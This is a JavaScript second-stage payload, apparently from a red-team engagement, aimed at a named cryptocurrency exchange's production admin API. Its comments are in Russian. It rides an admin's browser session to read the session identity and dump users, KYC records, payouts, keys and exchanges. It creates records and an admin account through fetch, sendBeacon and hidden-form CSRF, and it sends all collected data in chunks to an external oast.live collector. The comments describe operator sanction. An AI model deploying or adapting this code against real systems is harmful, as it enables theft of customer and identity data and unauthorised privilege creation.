/* ============================================================
 * stage2-t410.js — TASK-4-10, StealthEX redteam engagement
 * Исполняется в CSP-less relay realm (iframe /blog/wp-json/*),
 * загружается из onfocus-stage-0 через fetch(...).then(eval).
 *
 * Фазы:
 *   1) GET /api/admin/session  -> роль/идентичность (credentials:include)
 *   2) READ: exchanges/all/csv (полный дамп) + GET /<res>/all по всем
 *      GET-доступным ресурсам (см. матрицу в отчёте) + fallback POST /all
 *   3) WRITE-PROOF (санкция оператора 2026-10-27, НЕ деструктив):
 *      create kyt-check, create exchange (clone-контракт), watchlist add,
 *      admin -> create admin-user. Маркер: REDTEAM-TEST-TASK-4-10.
 *      Каждый write — 3 канала (fetch JSON / sendBeacon / form), затем
 *      read-back верификация маркера. block/delete/recalculate НЕ выполняются.
 *   4) Exfil чанками на коллектор (interactsh oast.live).
 *
 * Конфигурируемо для mock-теста: self.__S2CFG = {api, od, mock}
 * ============================================================ */
(function () {
  'use strict';
  var CFG = self.__S2CFG || {};
  var API = CFG.api || 'https://prod-admin-ui.stealthex.io/api/admin';
  var OD  = CFG.od  || 'https://dbghetk7eneenj3v2o7gsptx4ywihw1w6.oast.live';
  var RUN = CFG.run || ('rt' + Date.now().toString(36));
  var MARK = 'REDTEAM-TEST-TASK-4-10';
  var CRED = { credentials: 'include' };
  var state = { run: RUN, started: new Date().toISOString(), phase: [], artifacts: [], writes: [], verify: [] };

  /* ---------- exfil ---------- */
  function beacon(path, data) {
    // маленькие маркеры — GET query (канал, доказанный в TASK-4-02)
    var u = OD + '/' + path + '?r=' + RUN + '&d=' + encodeURIComponent(String(data == null ? '' : data)).slice(0, 1500);
    return fetch(u).catch(function () {});
  }
  function exfilChunk(name, idx, total, chunk) {
    // объёмы — POST text/plain (без preflight), тело чанка в raw-request коллектора
    return fetch(OD + '/p/' + RUN + '/' + name + '/' + idx + '/' + total, {
      method: 'POST',
      mode: 'no-cors',
      body: String(chunk)
    }).catch(function () {
      // fallback: GET-чанк (1000 символов безопасно для request-line)
      var sub = String(chunk).slice(0, 1000);
      return fetch(OD + '/g/' + RUN + '/' + name + '/' + idx + '/' + total + '?d=' + encodeURIComponent(sub)).catch(function () {});
    });
  }
  function exfilAll() {
    // манифест сначала (виден в коллекторе сразу)
    var man = { run: RUN, role: state.role, email: state.email, uid: state.uid,
                phase: state.phase, artifacts: state.artifacts.map(function (a) { return { name: a.name, status: a.status, len: a.len }; }),
                writes: state.writes, verify: state.verify };
    return beacon('m', JSON.stringify(man)).then(function () {
      var chain = Promise.resolve();
      state.artifacts.forEach(function (a) {
        if (!a.data || a.status !== 200) return;
        var chunks = [];
        for (var i = 0; i < a.data.length; i += 32000) chunks.push(a.data.slice(i, i + 32000));
        if (!chunks.length) chunks = [''];
        chunks.forEach(function (c, i) {
          chain = chain.then(function () { return exfilChunk(a.name, i, chunks.length, c); });
        });
      });
      return chain;
    }).then(function () { return beacon('done', state.artifacts.length); });
  }

  /* ---------- http helpers ---------- */
  function gj(url) { // GET json/text -> {status, text}
    return fetch(url, CRED).then(function (r) {
      return r.text().then(function (t) { return { status: r.status, text: t }; });
    }).catch(function (e) { return { status: 0, text: 'ERR ' + e }; });
  }
  function pj(url, body) { // POST JSON (может быть заблокирован preflight'ом — это тоже результат)
    return fetch(url, {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }).then(function (r) { return r.text().then(function (t) { return { status: r.status, text: t }; }); })
      .catch(function (e) { return { status: 0, text: 'ERR ' + e }; });
  }
  function patchj(url, body) {
    return fetch(url, {
      method: 'PATCH', credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }).then(function (r) { return r.text().then(function (t) { return { status: r.status, text: t }; }); })
      .catch(function (e) { return { status: 0, text: 'ERR ' + e }; });
  }
  function beaconWrite(url, body) {
    try {
      var ok = navigator.sendBeacon(url, new Blob([JSON.stringify(body)], { type: 'application/json' }));
      return { status: ok ? 'queued' : 'rejected', text: 'sendBeacon' };
    } catch (e) { return { status: 0, text: 'ERR ' + e }; }
  }
  function formWrite(url, fields) {
    return new Promise(function (res) {
      try {
        var ifr = document.createElement('iframe');
        ifr.name = 's2f' + Math.random().toString(36).slice(2, 7);
        ifr.style.cssText = 'display:none';
        document.body.appendChild(ifr);
        var f = document.createElement('form');
        f.method = 'POST'; f.action = url; f.target = ifr.name;
        f.enctype = 'application/x-www-form-urlencoded';
        Object.keys(fields).forEach(function (k) {
          var i = document.createElement('input');
          i.name = k; i.value = String(fields[k]);
          f.appendChild(i);
        });
        document.body.appendChild(f);
        f.submit();
        setTimeout(function () { res({ status: 'submitted', text: 'form-urlencoded (gate: 403/415 ожидаемо)' }); }, 300);
      } catch (e) { res({ status: 0, text: 'ERR ' + e }); }
    });
  }

  /* ---------- write-proof: три канала + read-back ---------- */
  function writeProof(tag, method, path, body, formFields, roleGate) {
    if (roleGate && roleGate.indexOf(state.role) < 0) {
      state.writes.push({ tag: tag, skipped: 'role ' + state.role });
      return Promise.resolve();
    }
    var url = API + path;
    var rec = { tag: tag, method: method, url: path, body: body, channels: {} };
    state.writes.push(rec);
    // канал 1: fetch JSON (работает только если preflight проходит)
    var p;
    if (method === 'PATCH') p = patchj(url, body);
    else p = pj(url, body);
    return p.then(function (r) {
      rec.channels.fetch_json = { status: r.status, head: String(r.text).slice(0, 160) };
      return sleep(600);
    }).then(function () {
      return verifyMarker(tag).then(function (v) { rec.readback_after_fetch = v; });
    }).then(function () {
      if (method === 'PATCH') {
        rec.channels.note = 'beacon/form не умеют PATCH — только канал fetch';
        return;
      }
      if (rec.readback_after_fetch && rec.readback_after_fetch.found) return;
      // канал 2: sendBeacon Blob application/json
      rec.channels.beacon = beaconWrite(url, body);
      return sleep(900);
    }).then(function () {
      if (method === 'PATCH') return;
      return verifyMarker(tag).then(function (v) { rec.readback_after_beacon = v; });
    }).then(function () {
      if (method === 'PATCH') return;
      if ((rec.readback_after_beacon && rec.readback_after_beacon.found) ||
          (rec.readback_after_fetch && rec.readback_after_fetch.found)) return;
      // канал 3: form urlencoded (гарантированно доходит до сервера)
      return formWrite(url, formFields || flatten(body)).then(function (r) {
        rec.channels.form = r;
        return sleep(700);
      });
    }).then(function () {
      return verifyMarker(tag).then(function (v) { rec.readback_final = v; });
    });
  }
  function flatten(o) {
    var out = {};
    Object.keys(o || {}).forEach(function (k) { out[k] = typeof o[k] === 'object' ? JSON.stringify(o[k]) : o[k]; });
    return out;
  }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var VERIFY_RES = {
    'kyt': 'kyt-checks',
    'exchange': 'exchanges',
    'admin-user': 'admin-users',
    'watched': 'watched-exchanges'
  };
  function verifyMarker(tag) {
    var res = VERIFY_RES[tag];
    if (!res) return Promise.resolve({ found: false, note: 'no readback res' });
    return gj(API + '/' + res + '/all?offset=0&limit=50').then(function (r) {
      var keys = [MARK, 'redteam-test-410', 'RT410'];
      if (res === 'watched-exchanges') keys.push('watchedSince');
      var found = r.status === 200 && keys.some(function (k) { return r.text.indexOf(k) >= 0; });
      var v = { res: res, status: r.status, found: found };
      if (found) {
        var idx = r.text.indexOf(MARK);
        if (idx < 0) idx = r.text.indexOf('redteam-test-410');
        if (idx < 0) idx = r.text.indexOf('RT410');
        v.snippet = r.text.slice(Math.max(0, idx - 200), idx + 300);
      }
      state.verify.push(v);
      return v;
    });
  }

  /* ---------- роль-маппинг (RBAC из app_utils_access-control_index.ts) ---------- */
  var RESOURCES = [
    // GET /<res>/all подтверждён (401 unauth = роут жив): users/kycs/sumsub-reviews/payouts/
    // partners/passkeys/keys/links/admin-users/exchanges/kyt-checks/pairs/widgets/banners/
    // buttons/faqs/hiws/currencies/internal/networks/internal/feature-flags/rules/exchange-route/
    // terms/privacy-policies/marketing-pairs/medias/reviews/press
    'exchanges', 'users', 'kycs', 'sumsub-reviews', 'payouts', 'partners', 'passkeys',
    'keys', 'links', 'admin-users', 'kyt-checks', 'pairs', 'widgets', 'banners', 'buttons',
    'faqs', 'hiws', 'currencies/internal', 'networks/internal', 'feature-flags',
    'rules/exchange-route', 'terms', 'privacy-policies', 'marketing-pairs', 'medias',
    'reviews', 'press'
  ];
  var POST_ONLY = ['watched-exchanges', 'route-inspector', 'exchange-statistics', 'route-statistics'];

  function readAll() {
    var jobs = [];
    // главный дамп одним запросом
    jobs.push(function () {
      return gj(API + '/exchanges/all/csv?filters=').then(function (r) {
        state.artifacts.push({ name: 'exchanges-all-csv', status: r.status, len: r.text.length, data: r.text });
      });
    });
    RESOURCES.forEach(function (res) {
      jobs.push(function () {
        var name = res.replace(/\//g, '_') + '-all';
        return gj(API + '/' + res + '/all?offset=0&limit=1000').then(function (r) {
          state.artifacts.push({ name: name, status: r.status, len: r.text.length, data: r.text });
          if (r.status >= 400 && r.status !== 401 && r.status !== 403) {
            // query-параметры могли быть отвергнуты валидацией — голый URL
            return gj(API + '/' + res + '/all').then(function (r2) {
              state.artifacts.push({ name: name + '-bare', status: r2.status, len: r2.text.length, data: r2.text });
            });
          }
        });
      });
    });
    POST_ONLY.forEach(function (res) {
      jobs.push(function () {
        return pj(API + '/' + res + '/all', { offset: 0, limit: 1000, sorters: [], filters: [] }).then(function (r) {
          state.artifacts.push({ name: res + '-all-POST', status: r.status, len: String(r.text).length,
                                 data: r.status === 200 ? r.text : String(r.text).slice(0, 300) });
        });
      });
    });
    // агрегатная статистика (unauth-доступна — полезна для контекста)
    jobs.push(function () {
      return gj(API + '/stats/datasets/exchanges/graph?from=2026-09-01T00:00:00.000Z&to=' +
                new Date().toISOString() + '&granularity=day&source=site').then(function (r) {
        state.artifacts.push({ name: 'stats-graph', status: r.status, len: r.text.length, data: r.text.slice(0, 20000) });
      });
    });
    // последовательно, чтобы не превышать бюджет запросов
    return jobs.reduce(function (chain, job) {
      return chain.then(function () { return sleep(150); }).then(job);
    }, Promise.resolve());
  }

  function writeProofs() {
    // 1) kyt-check (support+): маркер в address
    var p = writeProof('kyt', 'POST', '/kyt-checks',
      { address: MARK, internalNetworkCode: null },
      { address: MARK }, ['support', 'support-new', 'head-of-support', 'admin']);
    // 2) watched (support+): PATCH watched-exchanges/<exId>
    p = p.then(function () {
      return gj(API + '/exchanges/all?offset=0&limit=1').then(function (r) {
        var exId = null, cur = { from: null, to: null };
        try {
          var rows = JSON.parse(r.text);
          var row = rows && rows[0];
          if (row) {
            exId = row.id != null ? row.id : row.publicId;
            cur.from = row.internalCurrencyIdFrom != null ? row.internalCurrencyIdFrom : (row.currencyFromId != null ? row.currencyFromId : null);
            cur.to = row.internalCurrencyIdTo != null ? row.internalCurrencyIdTo : (row.currencyToId != null ? row.currencyToId : null);
          }
        } catch (e) {}
        // 2a) create exchange (clone-контракт: publicId/internalCurrencyIdFrom/To/amountFrom/addressTo/market)
        var exBody = {
          publicId: 'RT410-' + Date.now().toString(36),
          internalCurrencyIdFrom: cur.from != null ? cur.from : null,
          internalCurrencyIdTo: cur.to != null ? cur.to : null,
          amountFrom: '41.10410',
          addressTo: MARK,
          market: ''
        };
        var hasCur = cur.from != null && cur.to != null;
        return writeProof('exchange', 'POST', '/exchanges', exBody,
          flatten(exBody), ['support', 'support-new', 'head-of-support', 'admin'])
          .then(function () {
            if (!hasCur) {
              state.writes.push({ tag: 'exchange', note: 'currency ids недоступны из /exchanges — create пропущен/усечён' });
            }
            // 2b) watched: ссылаемся на свой новый exchange, иначе — на первый из списка
            var wid = exId;
            return writeProof('watched', 'PATCH', '/watched-exchanges/' + wid,
              { watchedSince: new Date().toISOString() },
              { watchedSince: new Date().toISOString() },
              ['support', 'support-new', 'head-of-support', 'admin']);
          });
      });
    });
    // 3) admin-user (ТОЛЬКО admin): маркер в name/email, роль support (минимальные привилегии)
    p = p.then(function () {
      return writeProof('admin-user', 'POST', '/admin-users',
        { email: 'redteam-test-410@redteam.invalid', role: 'support', name: 'REDTEAM-TEST TASK-4-10' },
        { email: 'redteam-test-410@redteam.invalid', role: 'support', name: 'REDTEAM-TEST TASK-4-10' },
        ['admin']);
    });
    return p;
  }

  /* ---------- main ---------- */
  state.phase.push('start');
  if (parent && parent !== self) {
    try { parent.__s2 = { run: RUN, state: state }; } catch (e) {}
  }
  self.__s2 = { run: RUN, state: state };

  return gj(API + '/session').then(function (r) {
    state.phase.push('session:' + r.status);
    if (r.status === 200) {
      try {
        var j = JSON.parse(r.text);
        var s = j.session || j;
        state.role = s.role; state.email = s.email; state.uid = s.id; state.name = s.name;
      } catch (e) {
        try {
          var m = r.text.match(/"role"\s*:\s*"([^"]+)"/); if (m) state.role = m[1];
          var e2 = r.text.match(/"email"\s*:\s*"([^"]+)"/); if (e2) state.email = e2[1];
        } catch (e3) {}
      }
    }
    if (r.status !== 200 || !state.role) {
      state.phase.push('no-session');
      return beacon('ns', r.status + ' ' + String(r.text).slice(0, 80)).then(function () {
        state.phase.push('done-no-session');
        return state;
      });
    }
    return beacon('sess', state.role + '|' + state.email).then(function () {
      state.phase.push('read');
      return readAll();
    }).then(function () {
      state.phase.push('write');
      return writeProofs();
    }).then(function () {
      state.phase.push('exfil');
      return exfilAll();
    }).then(function () {
      state.phase.push('done');
      return state;
    });
  }).catch(function (e) {
    state.phase.push('fatal:' + e);
    return beacon('fatal', String(e).slice(0, 120)).then(function () { return state; });
  });
})();
